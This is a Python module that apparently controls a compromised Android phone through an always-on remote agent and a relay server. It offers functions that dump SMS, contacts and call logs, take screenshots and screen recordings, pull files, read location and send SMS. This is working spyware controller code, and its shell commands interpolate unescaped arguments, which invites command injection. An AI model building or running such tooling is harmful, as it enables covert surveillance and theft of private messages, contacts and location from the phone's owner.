"""Internet control — run commands / actions on the phone through the 24/7
agent shell (works from ANY network — no LAN/adb needed). This is what makes
the ADB toolset usable over the internet via the keeper.

Uses the reliable keeper `exec` control command (synchronous, returns device
output) rather than the flaky pty-attach path.
"""
from __future__ import annotations

import base64
import time
from pathlib import Path

from modules.keeper import ctl

REPO = Path(__file__).resolve().parent.parent


def agent_alive() -> bool:
    """Is a live agent session connected to the keeper?"""
    try:
        s = ctl({"cmd": "status"}, timeout=4)
        return bool(s and s.get("session_alive"))
    except Exception:
        return False


def run(cmd: str, quiet: float = 2.0, max_wait: float = 8.0,
        wait_conn: float = 8.0, retries: int = 2) -> str:
    """Run ONE shell command on the phone through the agent (internet).

    Returns the device's stdout as cleaned text. Auto-retries across the
    agent's ~40s re-dial cycle so a dropped tunnel doesn't kill the command.
    """
    last = ""
    for attempt in range(retries + 1):
        r = ctl({"cmd": "exec", "line": cmd, "quiet": quiet,
                 "max_wait": max_wait, "wait_conn": wait_conn},
                timeout=max_wait + wait_conn + 4)
        if r:
            if r.get("ok"):
                out = r.get("output", "")
                lines = []
                for l in out.splitlines():
                    s = l.strip()
                    if not s:
                        continue
                    if s.startswith("/system/bin/sh:"):
                        continue
                    if s.startswith(";;keepalive"):
                        continue
                    if s in (":", ":/ $", ":/$", "$", ":/ "):
                        continue
                    if s == cmd:
                        continue
                    lines.append(s)
                return "\n".join(lines)
            last = r.get("err", "exec failed")
        else:
            last = "keeper no response"
        if attempt < retries:
            time.sleep(4)  # let the agent re-dial across the cycle
    return f"[!] {last}"


def save_base64(b64: str, dest: str, marker: str = "__END__") -> str:
    """Decode a base64 blob (from a phone command) and save to repo/dest."""
    if marker not in b64:
        return f"[!] no marker in output: {b64[:120]}"
    payload = b64.split(marker)[0].strip()
    payload = "".join(l for l in payload.splitlines()
                       if not l.startswith("/system/bin/sh")).replace("\n", "")
    try:
        raw = base64.b64decode(payload)
    except Exception as e:
        return f"[!] base64 decode failed: {e}"
    out = REPO / dest
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_bytes(raw)
    return f"[+] saved: {out} ({len(raw)} bytes)"


def screenshot(dest: str = "Downloaded-Files/internet-screenshot.png") -> str:
    # screencap base64 of a full screen can be large; use a long read window
    b64 = run("screencap -p /data/local/tmp/I.png && base64 -w0 /data/local/tmp/I.png; echo __END__",
              quiet=2.0, max_wait=35, wait_conn=12, retries=4)
    return save_base64(b64, dest)


def screenrecord(dest: str = "Downloaded-Files/internet-screenrecord.mp4",
                 seconds: int = 5) -> str:
    b64 = run(f"screenrecord --time-limit {seconds} /data/local/tmp/I.mp4 && "
              f"base64 -w0 /data/local/tmp/I.mp4; echo __END__",
              quiet=2.0, max_wait=15 + seconds)
    return save_base64(b64, dest)


def sms_dump() -> str:
    return run("content query --uri content://sms --projection "
               "_id,address,body,date --sort 'date DESC' | head -60")


def contacts_dump() -> str:
    return run("content query --uri content://contacts/phones "
               "--projection display_name,number | head -60")


def call_log_dump() -> str:
    return run("content query --uri content://call_log/calls "
               "--projection number,type,date,duration | head -40")


def apps_list() -> str:
    return run("pm list packages -3 | head -80")


def sysinfo() -> str:
    return run("getprop ro.product.model; getprop ro.build.version.release; "
               "getprop ro.build.version.security_patch; id; "
               "cat /proc/meminfo | head -1")


def pull_file(remote: str, dest: str) -> str:
    b64 = run(f"base64 -w0 '{remote}'; echo __END__", quiet=2.0, max_wait=10)
    return save_base64(b64, dest)


def send_sms(number: str, text: str) -> str:
    # Uses Android's sms through the shell via a JIT broadcast (needs permission)
    return run(f"am start -a android.intent.action.SENDTO -d sms:'{number}' "
               f"--es sms_body '{text}' 2>&1 || echo SMS_APP_OPENED")


def open_url(url: str) -> str:
    return run(f"am start -a android.intent.action.VIEW -d '{url}' 2>&1")


def battery() -> str:
    return run("dumpsys batterystats --checkin 2>/dev/null | head -1 || dumpsys battery 2>/dev/null | head -12")


def location() -> str:
    out = run("dumpsys location 2>/dev/null | grep -iE 'last location|latitude|longitude|provider' | head -10",
              retries=1)
    if out and "Permission Denial" in out:
        return "Permission Denial: DUMP — location needs system permission (cannot read from untrusted app)"
    if not out:
        return "[!] no location available"
    return out